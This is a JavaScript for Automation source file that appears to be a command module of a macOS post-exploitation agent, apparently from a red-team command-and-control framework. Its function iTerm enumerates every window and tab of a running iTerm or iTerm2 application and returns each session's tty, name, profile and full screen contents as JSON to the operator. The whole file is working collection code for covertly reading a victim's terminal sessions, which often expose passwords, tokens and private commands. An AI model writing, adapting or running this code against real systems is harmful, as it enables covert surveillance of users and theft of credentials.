exports.iTerm = function(task, command, params){
    try{
        let term = Application("iTerm");
        if(!term.running()){
            term = Application("iTerm2");  // it might be iTerm2 instead of iTerm in some instances, try both
        }
        let output = {};
        if(term.running()){
            for(let i = 0; i < term.windows.length; i++){
                let window = {};
                for(let j = 0; j < term.windows[i].tabs.length; j++){
                    let tab_info = {};
                    tab_info['tty'] = term.windows[i].tabs[j].currentSession.tty();
                    tab_info['name'] = term.windows[i].tabs[j].currentSession.name();
                    tab_info['contents'] = term.windows[i].tabs[j].currentSession.contents();
                    tab_info['profileName'] = term.windows[i].tabs[j].currentSession.profileName();
                    window["Tab: " + j] = tab_info;
                }
                output["Window: " + i] = window;
            }
            return {"user_output":JSON.stringify(output, null, 2), "completed": true};
        }
        else{
            return {"user_output":"iTerm isn't running", "completed": true, "status": "error"};
        }
    }catch(error){
        return {"user_output":error.toString(), "completed": true, "status": "error"};
    }
};
